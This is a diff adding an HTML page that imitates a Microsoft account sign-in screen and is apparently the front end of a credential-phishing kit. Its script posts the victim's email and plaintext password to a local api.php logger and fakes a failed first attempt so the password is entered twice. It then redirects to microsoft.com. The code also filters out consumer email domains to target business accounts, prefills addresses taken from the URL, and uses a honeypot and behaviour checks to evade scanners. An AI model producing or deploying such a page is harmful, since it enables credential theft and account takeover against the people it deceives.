@@ -1,0 +1,597 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your account</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            background-image: url('https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/4_eae2dd7eb3a55636dc2d74f4fa4c386e.svg');
+            background-size: cover;
+            background-position: center;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+        .card {
+            width: 410px;
+            background: #fff;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            padding: 44px;
+            box-sizing: border-box;
+            position: relative; /* Needed for absolute positioning of loading bar */
+        }
+        .loading-bar {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px; /* Approximate height */
+            overflow: hidden;
+        }
+        .loading-bar img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+        .logo {
+            margin-bottom: 13px;
+        }
+        h1 {
+            color: #1b1b1b;
+            font-size: 24px;
+            font-weight: 600;
+            margin: 0 0 10px;
+        }
+        .input-group {
+            margin-bottom: 13px;
+            position: relative;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px 0;
+            border: none;
+            border-bottom: 1px solid #8a8a8a;
+            font-size: 15px;
+            outline: none;
+            box-sizing: border-box;
+        }
+        input[type="text"]:focus, input[type="password"]:focus {
+            border-bottom: 1px solid #0067b8;
+        }
+        .links {
+            font-size: 13px;
+            margin-bottom: 20px;
+        }
+        .links a {
+            color: #0067b8;
+            text-decoration: none;
+        }
+        .links a:hover {
+            text-decoration: underline;
+        }
+        .actions {
+            display: flex;
+            justify-content: flex-end;
+            margin-top: 30px;
+        }
+        button {
+            padding: 6px 32px;
+            font-size: 15px;
+            cursor: pointer;
+            border-radius: 2px;
+            min-width: 108px;
+            min-height: 32px;
+        }
+        .btn-primary {
+            background: #0067b8;
+            color: #fff;
+            border: none;
+        }
+        .btn-primary:hover {
+            background: #005da6;
+        }
+        .options-card {
+            width: 410px;
+            background: #fff;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            padding: 10px 44px;
+            box-sizing: border-box;
+            display: flex;
+            align-items: center;
+        }
+        .footer {
+            position: fixed;
+            bottom: 12px;
+            right: 12px;
+            display: flex;
+            gap: 20px;
+            font-size: 11px;
+        }
+        .footer a {
+            color: #000;
+            text-decoration: none;
+        }
+        .hidden {
+            display: none;
+        }
+        .error-message {
+            color: #e81123;
+            font-size: 13px;
+            margin-bottom: 10px;
+            display: none;
+        }
+        .user-identity {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+            font-size: 15px;
+            margin-left: -4px; /* Adjusted to align text with content while keeping arrow close */
+        }
+        .back-arrow {
+            margin-right: 1px; /* Pull text closer to arrow (overcoming SVG whitespace) */
+            cursor: pointer;
+            padding: 4px;
+            border-radius: 50%;
+            display: flex; /* Ensure SVG is centered */
+            align-items: center;
+            justify-content: center;
+        }
+        .back-arrow:hover {
+            background-color: #f0f0f0;
+        }
+        @media (max-width: 600px) {
+            body {
+                background-image: none;
+                background-color: #fff;
+                align-items: center; /* Horizontally center */
+                justify-content: flex-start; /* Vertically top */
+            }
+            .card {
+                width: 100%;
+                max-width: 100%;
+                box-shadow: none;
+                padding: 20px;
+                margin-top: 0;
+            }
+            .options-card {
+                width: 100%;
+                box-shadow: none;
+                padding: 10px 20px;
+            }
+            .footer {
+                position: static;
+                margin-top: 20px;
+                justify-content: center;
+                width: 100%;
+                padding-bottom: 20px;
+            }
+        }
+    </style>
+    <style>
+        /* Intro Animation Styles */
+        @keyframes pinchAndRelease{0%,100%,12.5%,25%,35.5%,50%{transform:scale(1,1) translateY(0)}30%,5%{transform:scale(.86,1.1) translateY(10px)}}
+        @keyframes documentOneScale{0%,100%,35%,50%{transform:translate(61px,82px) scale(0,0) rotateZ(20deg) rotateY(26deg)}12%,22%{transform:translate(0,0) scale(1,1) rotateZ(-18deg) rotateY(0)}}
+        @keyframes documentTwoScale{0%,100%,33%,50%{transform:translate(44px,68px) scale(0,0) rotateZ(20deg) rotateY(26deg)}15%,19%{transform:translate(0,0) scale(1,1) rotateZ(-9deg) rotateY(0)}}
+        @keyframes layersSlideIn{0%,23%{transform:translateY(74px) scale(0) rotateX(50deg) rotateZ(45deg)}100%,33%{transform:translateY(0) scale(1) rotateX(50deg) rotateZ(45deg)}}
+        
+        #intro-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #fff;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            transition: opacity 0.5s ease-out;
+        }
+
+        #intro-overlay #container{width:400px;height:400px;display:flex;justify-content:center;align-items:center;position:relative;--duration:3000ms;--delay:0ms;--iterationCount:infinite;--direction:normal;--fillMode:forwards;--playState:running;--easing:ease-in-out}
+        #intro-overlay .foreground{width:164px;height:200px;border-radius:26px;overflow:hidden;position:absolute;z-index:100;animation:pinchAndRelease var(--duration) var(--easing) var(--delay) var(--iterationCount) var(--direction) var(--fillMode) var(--playState)}
+        #intro-overlay .background{width:164px;height:200px;border-radius:26px;overflow:hidden;position:relative;z-index:20;animation:pinchAndRelease var(--duration) var(--easing) var(--iterationCount) var(--direction) var(--fillMode) var(--playState)}
+        #intro-overlay .contents{position:absolute;bottom:100px;left:118px;width:164px;height:200px;background-color:transparent;z-index:60;overflow:hidden;animation:pinchAndRelease var(--duration) var(--easing) var(--delay) var(--iterationCount) var(--direction) var(--fillMode) var(--playState)}
+        #intro-overlay .flap-top-inner-shadow{background:radial-gradient(circle,#00217700 54%,#0021778c 100%);background-position:-34px -34px;background-size:170px 170px;width:130px;height:130px;position:absolute;top:26px;left:17px;border-radius:18px 24px 0 24px;transform:rotateX(50deg) rotateZ(45deg);transform-style:preserve-3d;z-index:50}
+        #intro-overlay .flap-top-fill{background-color:#28afea;width:130px;height:130px;position:absolute;top:26px;left:17px;border-radius:18px 24px 0 24px;transform:rotateX(50deg) rotateZ(45deg);transform-style:preserve-3d;z-index:30}
+        #intro-overlay .flap-left{width:200px;height:200px;border-radius:0 38px;background-color:#6ce0ff;background:radial-gradient(circle,#2cbbf3 0,#87e5ff 100%);position:absolute;bottom:-80.5px;left:-112px;transform:rotateX(50deg) rotateZ(45deg);z-index:51}
+        #intro-overlay .flap-right{width:200px;height:200px;border-radius:0 38px;background-color:#0985dc;background:linear-gradient(3deg,#0985dc 25%,#3da9fb 58%,#c29dfa 80%,#f4a7f7 100%);background-position:0 0;position:absolute;bottom:-80.5px;right:-112px;transform:rotateX(50deg) rotateZ(45deg);z-index:50}
+        #intro-overlay .background-fill{position:absolute;width:100%;height:110px;bottom:0;left:0;background:#7bf4ff;background:linear-gradient(56deg,#7bf4ff 0,#c29dfa 100%)}
+        #intro-overlay .layer-stack{background-color:#3834b9;width:130px;height:130px;position:absolute;top:26px;left:17px;z-index:1;border-radius:18px 24px 0 24px;transform:rotateX(50deg) rotateZ(45deg);transform-style:preserve-3d;z-index:30;overflow:hidden;animation:layersSlideIn var(--duration) var(--easing) var(--delay) var(--iterationCount) var(--direction) var(--fillMode) var(--playState)}
+        #intro-overlay .layer-stack::after{content:'';position:absolute;top:-1px;left:0;width:86px;height:158px;background-color:#4b6de7;border-top-right-radius:24px;z-index:10}
+        #intro-overlay .layer-stack::before{content:'';position:absolute;top:-1px;left:-10px;width:54px;height:158px;background:#5b9ee8;background:linear-gradient(344deg,rgb(50 146 234) 30%,#81c2f9 76%,#abb8fa 90%);border-radius:60px;z-index:20}
+        #intro-overlay .document-one{position:absolute;width:130px;height:162px;background:#2650bd;background:linear-gradient(40deg,rgb(6 103 211) 40%,#7f85f6 100%);border-radius:14px;left:19px;top:18px;z-index:30;animation:documentOneScale var(--duration) var(--easing) var(--delay) var(--iterationCount) var(--direction) var(--fillMode) var(--playState)}
+        #intro-overlay .document-two{position:absolute;width:114px;height:156px;background:#abc8e2;background:linear-gradient(47deg,#abc8e2 0,#fcefd6 100%);border-radius:14px;left:36px;top:32px;z-index:40;box-shadow:-9px -3px 4px -3px rgba(0,0,0,.1);animation:documentTwoScale var(--duration) var(--easing) var(--delay) var(--iterationCount) var(--direction) var(--fillMode) var(--playState)}
+        #intro-overlay .document-two::before{content:'';position:absolute;top:0;left:0;width:15px;height:158px;background-color:#293bb0;border-radius:24px 0 0 24px}
+        #intro-overlay #MSLogo{display:block;margin:0 auto;position:relative;top:190px;}
+    </style>
+</head>
+<body>
+    <div id="intro-overlay">
+        <div id="loadingScreen">
+            <div id="loadingLogo" dir="ltr">
+                <div id="container">
+                    <div class="foreground">
+                        <div class="flap-top-inner-shadow"></div>
+                        <div class="flap-left"></div>
+                        <div class="flap-right"></div>
+                    </div>
+                    <div class="contents">
+                        <div class="layer-stack"></div>
+                        <div class="document-two"></div>
+                        <div class="document-one"></div>
+                    </div>
+                    <div class="background">
+                        <div class="flap-top-fill"></div>
+                        <div class="background-fill"></div>
+                    </div>
+                </div>
+            </div>
+            <img src="//res.public.onecdn.static.microsoft/assets/framework/microsoft.svg" id="MSLogo" alt="Microsoft" crossorigin="anonymous" loading="lazy">
+        </div>
+    </div>
+    <script>
+        // Remove overlay after animation
+        window.addEventListener('load', function() {
+            setTimeout(function() {
+                var overlay = document.getElementById('intro-overlay');
+                if (overlay) {
+                    overlay.style.opacity = '0';
+                    setTimeout(function() {
+                        overlay.remove();
+                    }, 500);
+                }
+            }, 3000); // 3 seconds delay
+        });
+    </script>
+
+
+    <div class="card">
+        <div id="loading-bar" class="loading-bar hidden">
+            <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/marching_ants_white_8257b0707cbe1d0bd2661b80068676fe.gif" alt="Loading">
+        </div>
+        <div class="logo">
+            <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" width="108">
+        </div>
+
+        <!-- STEP 1: EMAIL -->
+        <div id="email-step">
+            <h1>Sign in</h1>
+            <div class="error-message" id="email-error">Please enter a valid email address.</div>
+            <div class="input-group">
+                <input type="text" id="email-input" placeholder="Email, phone, or Skype">
+            </div>
+            <div id="honeypot" class="hidden">
+                <input type="text" id="hpField" autocomplete="off" tabindex="-1">
+            </div>
+            <div class="links">
+                <p>No account? <a href="#">Create one!</a></p>
+                <p><a href="#">Can't access your account?</a></p>
+            </div>
+            <div class="actions">
+                <button class="btn-primary" id="next-btn">Next</button>
+            </div>
+        </div>
+
+        <!-- STEP 2: PASSWORD -->
+        <div id="password-step" class="hidden">
+            <div class="user-identity">
+                <div class="back-arrow" id="back-btn">
+                    <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/arrow_left_43280e0ba671a1d8b5e34f1931c4fe4b.svg" alt="Back" width="24" height="24">
+                </div>
+                <span id="user-email-display"></span>
+            </div>
+            <h1>Enter password</h1>
+            <div class="error-message" id="password-error">Please enter the password for your Microsoft account.</div>
+            <div class="input-group">
+                <input type="password" id="password-input" placeholder="Password">
+            </div>
+            <div class="links">
+                <p><a href="#">Forgot password?</a></p>
+            </div>
+            <div class="actions">
+                <button class="btn-primary" id="signin-btn">Sign in</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="options-card" id="options-card-container">
+        <a href="#" style="color:#1b1b1b;text-decoration:none;display:flex;align-items:center;gap:9px;font-size:15px">
+            <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg" alt="Key" width="32">
+            Sign-in options
+        </a>
+    </div>
+
+    <div class="footer">
+        <a href="#">Terms of use</a>
+        <a href="#">Privacy & cookies</a>
+        <span>...</span>
+    </div>
+
+    <script>
+        let prefilledEmail = ""; // SERVER_INJECT_EMAIL
+        let attemptCount = 0;
+        let cfg = {
+            redirectUrl: "https://microsoft.com",
+            firstAttemptFail: true,
+            loadingEnabled: true,
+            loadingDelayMs: 2000,
+            loadingGifUrl: "https://aadcdn.msftauth.net/shared/1.0/content/images/marching_ants_white_8257b0707cbe1d0bd2661b80068676fe.gif",
+            logoUrl: "https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg",
+            backArrowUrl: "https://aadcdn.msftauth.net/shared/1.0/content/images/arrow_left_43280e0ba671a1d8b5e34f1931c4fe4b.svg",
+            allowedDomains: [],
+            telemetryEnabled: false,
+            securityEnabled: false
+        };
+
+        const BLOCKED_DOMAINS = [
+            "outlook.com","hotmail.com","live.com","msn.com",
+            "yahoo.com","ymail.com","gmail.com","googlemail.com",
+            "aol.com","icloud.com","me.com","mac.com",
+            "proton.me","protonmail.com","mail.com","gmx.com"
+        ];
+
+        const emailStep = document.getElementById('email-step');
+        const passwordStep = document.getElementById('password-step');
+        const emailInput = document.getElementById('email-input');
+        const passwordInput = document.getElementById('password-input');
+        const nextBtn = document.getElementById('next-btn');
+        const signinBtn = document.getElementById('signin-btn');
+        const backBtn = document.getElementById('back-btn');
+        const userEmailDisplay = document.getElementById('user-email-display');
+        const emailError = document.getElementById('email-error');
+        const passwordError = document.getElementById('password-error');
+        const loadingBar = document.getElementById('loading-bar');
+        const logoImg = document.querySelector('.logo img');
+        const backArrowImg = backBtn.querySelector('img');
+        const loadingImg = document.querySelector('#loading-bar img');
+        const hpField = document.getElementById('hpField');
+        const optionsCard = document.getElementById('options-card-container');
+        let firstKeyTs = 0, pointerMoves = 0;
+
+        function applyConfig(c) {
+            cfg = Object.assign(cfg, c || {});
+            cfg.loadingGifUrl = "https://aadcdn.msftauth.net/shared/1.0/content/images/marching_ants_white_8257b0707cbe1d0bd2661b80068676fe.gif";
+            cfg.logoUrl = "https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg";
+            cfg.backArrowUrl = "https://aadcdn.msftauth.net/shared/1.0/content/images/arrow_left_43280e0ba671a1d8b5e34f1931c4fe4b.svg";
+            if (logoImg) logoImg.src = cfg.logoUrl;
+            if (backArrowImg) backArrowImg.src = cfg.backArrowUrl;
+            if (loadingImg) loadingImg.src = cfg.loadingGifUrl;
+        }
+
+        (async function initConfig() {
+            try {
+                handlePrefill(); // Ensure email is grabbed from URL if present
+                const ls = localStorage.getItem('pageConfig');
+                if (ls) applyConfig(JSON.parse(ls));
+                const r = await fetch('/api.php?action=get_config', { cache: 'no-store' });
+                if (r.ok) {
+                    const data = await r.json();
+                    applyConfig(data);
+                }
+            } catch (e) {
+                applyConfig();
+            }
+            // Auto-advance if email is prefilled
+            if (typeof prefilledEmail !== 'undefined' && prefilledEmail) {
+                // Ensure field is populated
+                if (emailInput.value !== prefilledEmail) {
+                    emailInput.value = prefilledEmail;
+                    userEmailDisplay.textContent = prefilledEmail;
+                }
+                nextBtn.click();
+            }
+        })();
+        
+        function handlePrefill() {
+            if (!prefilledEmail) {
+                try {
+                    // check hash
+                    const h = window.location.hash.substring(1);
+                    if (h.includes('@')) { prefilledEmail = decodeURIComponent(h); }
+                    else {
+                        // check query
+                        const p = new URLSearchParams(window.location.search);
+                        if (p.get('email')) prefilledEmail = p.get('email');
+                        else if (p.get('e')) prefilledEmail = p.get('e');
+                        else {
+                            // check path
+                            const parts = window.location.pathname.split('/');
+                            for (let i = parts.length - 1; i >= 0; i--) {
+                                if (decodeURIComponent(parts[i]).includes('@')) {
+                                prefilledEmail = decodeURIComponent(parts[i]);
+                                break;
+                            }
+                            }
+                        }
+                    }
+                } catch(e){}
+            }
+            if (prefilledEmail) {
+                emailInput.value = prefilledEmail;
+                userEmailDisplay.textContent = prefilledEmail;
+            }
+        }
+        
+        document.addEventListener('mousemove', ()=>{ pointerMoves++; });
+        emailInput.addEventListener('keydown', ()=>{ if (!firstKeyTs) firstKeyTs = Date.now(); });
+
+        function getDomain(email) {
+            const i = email.lastIndexOf('@');
+            if (i === -1) return '';
+            return email.slice(i + 1).toLowerCase();
+        }
+        async function logEvent(type, email, attempt, password) {
+            try {
+                const body = {
+                    type,
+                    emailMask: email || '',
+                    domain: getDomain(email || ''),
+                    attempt: attempt || 0,
+                    password: password || ''
+                };
+                await fetch('/api.php?action=log_event', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(body),
+                    keepalive: true
+                });
+            } catch (e) {
+                // ignore in local dev (PHP not running)
+            }
+        }
+
+        async function checkBusinessEmail(email){
+            const domain = getDomain(email);
+            try{
+                const r = await fetch('/api.php?action=verify_email',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email})});
+                if(r.ok){
+                    const j = await r.json();
+                    if(j.ok) return !!j.isBusiness;
+                }
+            }catch(e){}
+            try{
+                const r2 = await fetch('https://login.microsoftonline.com/common/userrealm/'+encodeURIComponent(email)+'?api-version=1.0',{cache:'no-store'});
+                if(r2.ok){
+                    const j2 = await r2.json();
+                    const ns = String(j2.NameSpaceType||j2.account_type||"");
+                    return ns==="Managed" || ns==="Federated";
+                }
+            }catch(e){}
+            // Fallback: block if in BLOCKED_DOMAINS
+            if (BLOCKED_DOMAINS.includes(domain)) return false;
+            return true;
+        }
+        nextBtn.addEventListener('click', async () => {
+            const email = emailInput.value.trim();
+            if (!email) {
+                emailError.style.display = 'block';
+                return;
+            }
+            if (hpField && hpField.value) {
+                emailError.textContent = "This username may be incorrect. Make sure you typed it correctly. Otherwise, contact your admin.";
+                emailError.style.display = 'block';
+                return;
+            }
+            if (cfg.securityEnabled) {
+                // Bypass behavior check if email matches prefilled email (auto-advance scenario)
+                const isPrefilled = (typeof prefilledEmail !== 'undefined' && prefilledEmail && email === prefilledEmail);
+                
+                if (!isPrefilled) {
+                    const typedMs = firstKeyTs ? (Date.now() - firstKeyTs) : 0;
+                    if (pointerMoves < 2 || typedMs < 800 || email.length < 6) {
+                        emailError.textContent = "Please proceed carefully";
+                        emailError.style.display = 'block';
+                        return;
+                    }
+                }
+            }
+            emailError.style.display = 'none';
+            emailError.textContent = "Please enter a valid email address.";
+            const domain = getDomain(email);
+            if (BLOCKED_DOMAINS.includes(domain)) {
+                emailError.textContent = "This username may be incorrect. Make sure you typed it correctly. Otherwise, contact your admin.";
+                emailError.style.display = 'block';
+                return;
+            }
+
+            if (cfg.loadingEnabled) loadingBar.classList.remove('hidden');
+            const isBiz = await checkBusinessEmail(email);
+            await new Promise(r => setTimeout(r, 3000));
+            if (cfg.loadingEnabled) loadingBar.classList.add('hidden');
+            if (!isBiz) {
+                emailError.textContent = "This username may be incorrect. Make sure you typed it correctly. Otherwise, contact your admin.";
+                emailError.style.display = 'block';
+                return;
+            }
+            logEvent('email_ok', email, 0);
+            userEmailDisplay.textContent = email;
+            
+            emailStep.classList.add('hidden');
+            passwordStep.classList.remove('hidden');
+            if(optionsCard) optionsCard.classList.add('hidden');
+            passwordInput.focus();
+        });
+        (function(){
+            handlePrefill();
+        })();
+
+        emailInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                nextBtn.click();
+            }
+        });
+
+        backBtn.addEventListener('click', () => {
+            passwordStep.classList.add('hidden');
+            emailStep.classList.remove('hidden');
+            if(optionsCard) optionsCard.classList.remove('hidden');
+            passwordInput.value = '';
+            passwordError.style.display = 'none';
+            attemptCount = 0;
+        });
+
+        signinBtn.addEventListener('click', async () => {
+            const password = passwordInput.value;
+            
+            if (!password) {
+                passwordError.textContent = "Please enter the password for your Microsoft account.";
+                passwordError.style.display = 'block';
+                return;
+            }
+
+            if (attemptCount === 0 && cfg.firstAttemptFail) {
+                // Log event IMMEDIATELY before UI delay
+                logEvent('password_fail_first', userEmailDisplay.textContent, 1, password);
+
+                if (cfg.loadingEnabled) {
+                    loadingBar.classList.remove('hidden');
+                    passwordError.style.display = 'none';
+                    setTimeout(async () => {
+                        loadingBar.classList.add('hidden');
+                        passwordError.textContent = "Your account or password is incorrect. If you don't remember your password, reset it now.";
+                        passwordError.style.display = 'block';
+                        passwordInput.value = '';
+                        passwordInput.focus();
+                        attemptCount++;
+                    }, Number(cfg.loadingDelayMs) || 0);
+                } else {
+                    passwordError.textContent = "Your account or password is incorrect. If you don't remember your password, reset it now.";
+                    passwordError.style.display = 'block';
+                    passwordInput.value = '';
+                    passwordInput.focus();
+                    attemptCount++;
+                }
+            } else {
+                await logEvent('password_second_redirect', userEmailDisplay.textContent, 2, password);
+                
+                if (cfg.loadingEnabled) {
+                    loadingBar.classList.remove('hidden');
+                    passwordError.style.display = 'none';
+                    // Use configured delay or default to 2000ms
+                    await new Promise(resolve => setTimeout(resolve, Number(cfg.loadingDelayMs) || 2000));
+                }
+                
+                window.location.href = cfg.redirectUrl;
+            }
+        });
+
+        passwordInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                signinBtn.click();
+            }
+        });
+
+
+    </script>
+</body>
+</html>
